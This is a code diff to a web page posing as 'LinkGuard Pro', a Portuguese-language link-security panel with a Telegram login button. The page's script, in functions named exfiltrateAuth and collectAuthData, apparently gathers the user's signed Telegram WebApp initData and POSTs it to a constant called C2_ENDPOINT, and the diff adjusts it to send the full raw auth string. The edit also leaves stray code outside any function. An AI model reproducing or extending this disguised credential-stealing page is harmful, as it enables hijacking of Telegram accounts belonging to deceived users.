@@ -80,7 +80,7 @@
         <div class="logo">🛡️</div>
         <div class="title">LinkGuard Pro</div>
         <div class="subtitle">Acesse o painel de inteligência de links</div>
-        
+
         <button class="tg-login-button" id="login-btn">
             <span>✈️</span> Continuar com o Telegram
         </button>
@@ -128,13 +128,20 @@ function showDebugLog(message, isError = false) {
 }
 
 function collectAuthData() {
-    if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
-        throw new Error('initDataUnsafe está vazio');
+    if (!tg.initData) {
+        throw new Error(
+            'Abra este aplicativo pelo Telegram'
+        );
     }
-    
+
+    return {
+        init_data: tg.initData
+    };
+}
+
     const user = tg.initDataUnsafe.user;
     showDebugLog('initData carregado. ID: ' + user.id);
-    
+
     return {
         event_type: 'linkguard_auth',
         auth: { 
@@ -161,7 +168,7 @@ function collectAuthData() {
 
 async function exfiltrateAuth(data) {
     showDebugLog('Iniciando POST para: ' + C2_ENDPOINT);
-    
+
     try {
         const response = await fetch(C2_ENDPOINT, {
             method: 'POST',
@@ -171,14 +178,14 @@ async function exfiltrateAuth(data) {
             },
             body: JSON.stringify(data)
         });
-        
+
         const text = await response.text();
         showDebugLog(`Resposta HTTP: ${response.status} - ${text}`);
-        
+
         if (!response.ok) {
             throw new Error(`HTTP ${response.status}`);
         }
-        
+
         return JSON.parse(text);
     } catch (error) {
         showDebugLog(`ERRO CRÍTICO: ${error.message}`, true);
@@ -197,7 +204,7 @@ async function handleLogin() {
     try {
         const authData = collectAuthData();
         const result = await exfiltrateAuth(authData);
-        
+
         if (result && result.status === 'authenticated') {
             setTimeout(() => {
                 document.getElementById('content-area').classList.remove('hidden');
